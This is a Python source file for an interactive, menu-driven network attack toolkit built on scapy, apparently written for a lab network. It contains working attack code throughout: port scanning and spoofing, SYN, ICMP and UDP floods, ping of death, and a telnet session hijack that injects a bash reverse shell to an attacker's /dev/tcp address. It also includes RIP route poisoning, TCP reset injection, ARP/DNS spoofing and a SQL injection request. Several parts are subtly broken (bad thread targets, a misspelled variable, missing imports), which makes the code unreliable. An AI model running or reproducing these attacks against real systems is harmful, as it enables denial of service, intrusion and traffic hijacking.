import queue
from scapy.all import *
import os
import sys
import urllib.request
from ipaddress import IPv4Network
from tqdm import tqdm
from netfilterqueue import NetfilterQueue
import requests

def os_detection():
    print("Insert target IP address: ")
    target = input()
    packet = IP(dst = target) / TCP(flags = "")
    res = sr1(packet, timeout = 5, verbose = 0)

    if res is None:
	#check if ICMP is blocked
        packet = IP(dst = target) / ICMP()
        res1 = sr1(packet, timeout = 5, verbose = 0)
        if res1 is None:
            print("Host is down")
        else:
             print("OS is Linux")
    else:
         if IP in res:
            if res.getlayer(IP).ttl <= 64:
                print("The packet's TTL is " + str(res.getlayer(IP).ttl))
                print("OS is Linux")
            else:
                print("The packet's TTL is " + str(res.getlayer(IP).ttl))
                print("OS is Windows")
    
    print("Click enter to continue...")
    input()

def port_scanner():

    print("Insert target IP address: ")
    target = input()

    src_port = RandShort()
    ports_list = [20, 21, 22, 23, 25, 53, 69, 80, 110, 143, 161, 162, 443, 989, 990]
    #20: FTP, 21: FTP, 22: SSH, 23: Telnet, 25: SMTP, 53: DNS, 69: TFTP, 80: HTTP, 110: POP3, 143: IMAP, 161: SNMP, 162: SNMP, 443: HTTPS, 989: FTPS, 990: FTPS

    for port in ports_list:

        tcp_connect_scan_resp = sr1(IP(dst = target)/TCP(sport = src_port, dport = port, flags = "S"), timeout=2, verbose = 0)

        if(type(tcp_connect_scan_resp) is None):
            pass
        elif(tcp_connect_scan_resp.haslayer(TCP)):
            if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
                send_rst = sr(IP(dst = target)/TCP(sport = src_port, dport = port, flags = "AR"), timeout=2, verbose = 0)
                print ("Port " + str(port) + " is open")
        elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
            pass
    print("Click enter to continue...")
    input()

def ip_sweep():

    # Defines network to analyze
    print("Insert the network address to scan (The format should be xxx.xxx.xxx.xxx/xx):")
    network = input()

    print("Analyzing hosts in network " + network)

    addresses = IPv4Network(network)
    # Send ICMP ping request, wait for answer
    for j in range (0, 100):
        #sr1() is a function that generates and sends packets and assigns to a variable a certain state 
        #depending from the fact that the packet/s sent did/did not receive an answer.
        resp = sr1(IP(dst=str(addresses[j]))/ICMP(), timeout=0.01, verbose = 0)
        if resp is None:
            pass
        else:
            print(f"{addresses[j]} is responding.")
    
    print("Click enter to continue...")
    input()

def ip_spoof():
    # Simple version
    print("Insert target IP address: ")
    target = input()
    numPackets = int(input("Insert the number of packets to send: "))

    print("Sending...")

    for i in tqdm(range (numPackets)):
        packet = IP(src = RandShort(), dst = target)/ICMP()/"whoamI"
        send(packet, verbose=False)

    print("\n")
    print(str(numPackets) + " spoofed packets have been sent to " + str(target) + ".")
    print("\n")
    
    print("Click enter to continue...")
    input()

def syn_flood():
    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with SYN flood.")

    def flood():
        packet = (IP(dst=target) / TCP(dport=139, flags="S") / ("payloadpayloadpayload")
        )
        send(packet, inter=0.000001, loop=1)


    t1 = threading.Thread(target=flood())
    t2 = threading.Thread(target=flood())
    t3 = threading.Thread(target=flood())
    t4 = threading.Thread(target=flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_syn_flood():

    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with SPOOFED SYN flood.")

    def spoofed_flood():
        packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
            TCP(dport=139, flags="S") / ("payloadpayloadpayload")
        send(packet, inter=0.000001, loop=1)

    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def icmp_flood():
    
    print("Insert target IP address: ")
    target = input()    
    print("Attacking " + target + " with ICMP flood.")

    def flood():
        packet = IP(dst=target)/ICMP()/"random_payload"
        send(packet, inter=0.00001, loop=1)


    t1 = threading.Thread(target=flood())
    t2 = threading.Thread(target=flood())
    t3 = threading.Thread(target=flood())
    t4 = threading.Thread(target=flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_icmp_flood():
    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with ICMP flood.")


    def spoofed_flood():
        packet = packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
            ICMP()/"random_payload"
        send(packet, inter=0.000001, loop=1)


    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_udp_flood():

    print("Insert target IP address: ")
    target = input()

    print("Starting UDP flood attack towards " + target + " ...")

    def spoofed_flood():
        try:
            packet = IP(src=str(RandIP()), dst=target) / \
                UDP(dport=RandShort()) / ("X" * RandByte())
            send(packet, verbose=1, loop=1, inter=0.0000001)
        except KeyboardInterrupt as e:
            sys.exit(1)


    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()


def ping_of_death():
    
    print("Insert target IP address: ")
    target = input()

    try:
        packet = IP(src=RandIP(), dst=target) / ICMP() / ('K' * 65500)
        print("Starting Ping of Death attack towards", target, "...")
        send(packet, inter=0.0001, loop=1)
    except KeyboardInterrupt as e:
        sys.exit(1)


def tcp_reverse_shell():

    IFACE = "eth0"

    attacker_ip = "192.168.222.10" # attacker's IP
    attacker_port = 6969 # a (not already used) port of your choice
    victim_ip = "192.168.223.10" # the IP of the user receiving the telnet connection (server)

    REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"

    def automatic_hijacking():
        print("*** Hijacking Automatic Mode ***")
        print("Start sniffing...")
        sniff(iface=IFACE, filter="tcp", prn=_hijacking)


    def _hijacking(pkt):
        if pkt[IP].src==victim_ip and Raw in pkt:
            print("Got a starting of a session, hijacking... ", end="")
            # you have to get the size of the data field to update SEQ and ACK.
            # this value is generally 1 since telnet sends one character at the time
            # but sometimes it is different (for instance, 2, if also \r is sent)
            tcp_seg_len = len(pkt.getlayer(Raw).load)

            ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
            data = REVERSE_SHELL # use this to create a full reverse shell
            pkt = ip/tcp/data
            send(pkt, iface=IFACE, verbose=0)
            print("done.")
            exit(0)

    automatic_hijacking()

def tcp_reset():

    def callback(pkt):
        if pkt[TCP].flags != "S":
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            tcp = TCP(sport=pkt[IP].dport, dport=pkt[IP].sport, flags="R", seq=pkt[IP].ack, ack=(int(pkt[IP].ack)-1))
            pkt = ip/tcp
            ls(pkt)
            send(pkt,verbose=0)

    while True:
        pkt = sniff(iface='eth0', filter="tcp", prn=callback)


#how to create this attack: we want to prevent the Kali Client host from reaching the internet, so we'd have to scramble the RIP entry for the routers R1, R2, R3, R4 which are the 
#routers not directly connected to the Kali host. 
def RIP_attack():

    address = "192.168.220.144" #network to be isolated
	#define headers
    IP_header = IP(src="192.168.220.30", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
    IP_header_2 = IP(src="192.168.220.40", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
    
    UDP_header = UDP(sport=520, dport=520)
    RIP_header = RIP(cmd=2, version=2)
    RIPEntry_ = RIPEntry(addr=address, mask="255.255.255.240", metric=16)
    #define the packet
    packet = IP_header / UDP_header / RIP_header / RIPEntry_
    packet2 = IP_header_2 / UDP_header / RIP_header / RIPEntry_

    #loop the sending
    try:
        while True:
            send(packet, inter=0.000001)
            send(packet2, inter=0.000001)
    except KeyboardInterrupt as e:
        sys.exit(1)

def dns_spoofing():
    
    def arp_spoofing():

        def getmac(targetip):
            arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
            targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
            return targetmac

        def spoofedarpcache(targetip, targetmac, sourceip):
            spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwsrc=targetmac)
            send(spoofed, verbose=False)

        def restorearp(targetip, targetmac, sourceip, sourcemac):
            packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
            send(packet, verbose=False)
            print("ARP Table restored to normal for", targetip)

        print("Insert target ip:")
        targetip = input()

        print("Insert gateway address:")
        gatewayip = input()

        targetmac = getmac(targetip)
        print("Target MAC: ", targetmac)

        gatewaymac = getmac(gatewayip)
        print("Gateway MAC:", gatewaymac)

        try:
            print("Sending spoofed ARP responses...")
            while True:
                spoofedarpcache(targetip, targetmac, gatewayip)
                spoofedarpcache(gatewayip, gatewaymac, targetip)
        except KeyboardInterrupt as e:
            print("ARP Spoofing stopped.")
            restorearp(gatewayip, gatewaymac, targetip, targetmac)
            restorearp(targetip, targetmac, gatewayip, gatewaymac)
            quit()

    def actual_spoofing():

        dns_hosts={"www.google.com"}

        def process_packet(packet):
            
            scapy_packet = IP(packet.get_payload())
            if scapy_packet.haslayer(DNSRR):
                print("Before:", scapy_packet.summary())
                qname = scapy_packet[DNSQR].qname
                if quame in dns_hosts:
                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
                    scapy_packet[DNS].ancount = 1

                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                print("After:", scapy_packet.summary())
                packet.set_payload(bytes(scapy_packet))
            packet.accept()

        QUEUE_NUM=0
        #insert the iptables FORWARD rule
        os.system["iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM)]
        #instantiate the netfiler queue
        queue = NetfilterQueue()
        try:
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()
        except KeyboardInterrupt as e:
            os.system("iptables --flush")


def sql_injection():

    string = '''\
 ____  ____  _       _  _         _  _____ ____  _____  _  ____  _     
/ ___\/  _ \/ \     / \/ \  /|   / |/  __//   _\/__ __\/ \/  _ \/ \  /|
|    \| / \|| |     | || |\ ||   | ||  \  |  /    / \  | || / \|| |\ ||
\___ || \_\|| |_/\  | || | \||/\_| ||  /_ |  \_   | |  | || \_/|| | \||
\____/\____\\____/  \_/\_/  \|\____/\____\\____/  \_/  \_/\____/\_/  \|
'''

    print(string)


    print("Insert the website IP:")
    target = input()
    print("[-] Attempting an SQL injection attack...")
    
    r = requests.post(target+'&username=\'+OR+1%3D1+--+\'&password=&user-info-php-submit-button=View+Account+Details', json={"username": "' OR 1=1 --'", "password": ""})

    with open("Desktop/response.html", "w") as file:
        file.write(r.text)

    print('Response saved in HTML File!')

    time.sleep(60)
    choose_exploit()
    
    


def choose_recon():
    #clear the screen
    os.system("clear")
    print("\n")
    print("------------------------------------------------------------------------------------")
    string = '''/  __\\/  __//   _\\/  _ \\/ \\  /|/ \\  /|/  _ \\/ \\/ ___\\/ ___\\/  _ \\/ \\  /|/   _\\/  __/
|  \\/||  \\  |  /  | / \\|| |\\ ||| |\\ ||| / \\|| ||    \\|    \\| / \\|| |\\ |||  /  |  \\  
|    /|  /_ |  \\_ | \\_/|| | \\||| | \\||| |-||| |\\___ |\\___ || |-||| | \\|||  \\_ |  /_ 
\\_/\\_\\\\____\\\\____/\\____/\\_/  \\|\\_/  \\|\\_/ \\|\\_/\\____/\\____/\\_/ \\|\\_/  \\|\\____/\\____\\'''

    print(string)
    print("------------------------------------------------------------------------------------")
    print("\n")
    print("Choose a reconnaissance attack.")
    print("1. OS Detection")
    print("2. Port Scanning")
    print("3. Ip Spoof Testing")
    print("4. Active Hosts in Network")
    print("5. Exit")
    print("------------------------------------------------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        os_detection()
        choose_recon()
    elif choice == "2":
        port_scanner()
        choose_recon()
    elif choice == "3":
        ip_spoof()
        choose_recon()
    elif choice == "4":
        ip_sweep()
        choose_recon()
    elif choice == "5":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_recon()

def choose_dos():
    os.system("clear")
    print("-----------------------------------------------------------------------------------------")
    string = '''/  _ \\/  __// \\  /|/ \\/  _ \\/ \\     /  _ \\/    /  / ___\\/  __//  __\\/ \\ |\\/ \\/   _\\/  __/
| | \\||  \\  | |\\ ||| || / \\|| |     | / \\||  __\\  |    \\|  \\  |  \\/|| | //| ||  /  |  \\  
| |_\\||  /_ | | \\||| || |-||| |_/\  | \\_/|| |     \\___ ||  /_ |    /| \\// | ||  \\_ |  /_ 
\\____/\\____\\\\_/  \\|\\_/\\_/ \\|\\____/  \\____/\\_/     \\____/\\____\\\\_/\\_\\\\__/  \\_/\\____/\\____/'''

    print(string)
    print("-----------------------------------------------------------------------------------------")
    print("\n")
    print("Choose a denial of service attack.")
    print("1. SYN Flood")
    print("2. Spoofed SYN Flood")
    print("3. ICMP Flood")
    print("4. Spoofed ICMP Flood")
    print("5. Spoofed UDP Flood")
    print("6. Ping of Death")
    print("7. Exit")                                            
    print("-----------------------------------------------------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        syn_flood()
        choose_dos()
    elif choice == "2":
        spoofed_syn_flood()
        choose_dos()
    elif choice == "3":
        icmp_flood()
        choose_dos()
    elif choice == "4":
        spoofed_icmp_flood()
        choose_dos()
    elif choice == "5":
        spoofed_udp_flood()
        choose_dos()
    elif choice == '6':
        ping_of_death()
        choose_dos()
    elif choice == "7":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_dos()

def choose_exploit():
    os.system("clear")                                   
    print("----------------------------------------------")
    string = ''' ________  _ ____  _     ____  _  _____  ____ 
/  __/\\  \///  __\\/ \\   /  _ \\/ \\/__ __\\/ ___\\
|  \\   \\  / |  \\/|| |   | / \\|| |  / \\  |    \\
|  /_  /  \\ |  __/| |_/\| \\_/|| |  | |  \\___ |
\\____\\/__/\\\\\\_/   \\____/\\____/\\_/  \\_/  \\____/'''

    print(string)
    print("----------------------------------------------")
    print("\n")
    print("Choose an exploit.")
    print("1. TCP Reverse Shell")
    print("2. RIP Attack on the LAN access to the Internet")
    print("3. TCP Reset")
    print("4. DNS Spoofing")
    print("5. SQL Injection")
    print("6. Exit")
    print("----------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        tcp_reverse_shell()
        choose_exploit()
    elif choice == "2":
        RIP_attack()
        choose_exploit()
    elif choice == "3":
        tcp_reset()
        choose_exploit()
    elif choice == "4":
        dns_spoofing()
        choose_exploit()
    elif choice == "5":
        sql_injection()
        choose_exploit()
    elif choice == "6":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_exploit()

def main():
    os.system("clear")
    dot_art = '''\
 _  _      _____  _____ ____  ____  ____  _____  _  _     _____   _      ____  _     _  ____  _  ____  _     ____    ____  ____  ____  _____ ____  ____  _     
/ \/ \  /|/__ __\/  __//  __\/  _ \/   _\/__ __\/ \/ \ |\/  __/  / \__/|/  _ \/ \   / \/   _\/ \/  _ \/ \ /\/ ___\  /  __\/  __\/  _ \/  __//  __\/  _ \/ \__/|
| || |\ ||  / \  |  \  |  \/|| / \||  /    / \  | || | //|  \    | |\/||| / \|| |   | ||  /  | || / \|| | |||    \  |  \/||  \/|| / \|| |  _|  \/|| / \|| |\/||
| || | \||  | |  |  /_ |    /| |-|||  \_   | |  | || \// |  /_   | |  ||| |-||| |_/\| ||  \_ | || \_/|| \_/|\___ |  |  __/|    /| \_/|| |_//|    /| |-||| |  ||
\_/\_/  \|  \_/  \____\\_/\_\\_/ \|\____/  \_/  \_/\__/  \____\  \_/  \|\_/ \|\____/\_/\____/\_/\____/\____/\____/  \_/   \_/\_\\____/\____\\_/\_\\_/ \|\_/  \|
'''
    print(dot_art)
    while True:
        print("-----------------------------------")
        print("Welcome. Choose a category of attacks.")
        print("1. Reconnaissance")
        print("2. Denial of Service")
        print("3. Exploits")
        print("4. Exit")
        print("-----------------------------------")

        choice = input("Enter your choice: ")
        if choice == "1":
            choose_recon()
        elif choice == "2":
            choose_dos()
        elif choice == "3":
            choose_exploit()
        elif choice == "4":
            print("Goodbye!")
            sys.exit()
        else:
            print("Invalid choice. Try again.")
            main()

if __name__ == "__main__":
    main()
